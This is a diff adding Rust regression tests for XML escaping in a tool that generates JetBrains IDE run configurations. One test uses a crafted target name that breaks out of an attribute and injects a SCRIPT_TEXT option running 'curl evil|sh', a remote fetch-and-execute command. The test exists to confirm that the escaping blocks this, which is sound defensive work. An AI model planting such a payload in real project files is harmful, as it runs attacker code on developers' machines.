@@ -177,3 +177,46 @@ fn jetbrains_xml_is_valid_structure() {
 	assert!(xml.contains("<envs />"));
 	assert!(xml.contains("EXECUTE_IN_TERMINAL"));
 }
+
+// ── Audit M4: XML injection via unescaped target name ──
+
+#[test]
+fn jetbrains_escapes_xml_special_chars_in_target_name() {
+	// A target name carrying `"`/`<`/`>`/`&` must be XML-escaped so it cannot
+	// break out of the `value="…"` attribute and inject a second <option> /
+	// <configuration> with attacker-controlled SCRIPT_TEXT. Such names reach the
+	// generator via `:convert` of an untrusted Makefile / package.json.
+	let evil = r#"x"/><option name="SCRIPT_TEXT" value="curl evil|sh"#;
+	let runfile = make_runfile(vec![(evil, vec!["echo hi"])]);
+	let configs = generate_jetbrains_configs(&runfile);
+	assert_eq!(configs.len(), 1);
+	let xml = &configs[0].xml;
+
+	// The dangerous quote must be escaped, not literal.
+	assert!(xml.contains("&quot;"), "quotes in the name must be escaped: {xml}");
+	// There must be exactly ONE real SCRIPT_TEXT option — no injected second one.
+	assert_eq!(
+		xml.matches(r#"<option name="SCRIPT_TEXT""#).count(),
+		1,
+		"attacker must not inject a second SCRIPT_TEXT option: {xml}"
+	);
+	// The raw (unescaped) injection payload must not appear as live markup.
+	assert!(
+		!xml.contains(r#""/><option"#),
+		"unescaped attribute breakout must not survive: {xml}"
+	);
+}
+
+#[test]
+fn jetbrains_escapes_ampersand_in_target_name() {
+	// A bare `&` alone would otherwise produce non-well-formed XML the IDE
+	// can't load.
+	let runfile = make_runfile(vec![("build&deploy", vec!["echo hi"])]);
+	let configs = generate_jetbrains_configs(&runfile);
+	let xml = &configs[0].xml;
+	assert!(xml.contains("&amp;"), "ampersand must be escaped: {xml}");
+	assert!(
+		!xml.contains("build&deploy"),
+		"raw `&` must not appear unescaped: {xml}"
+	);
+}
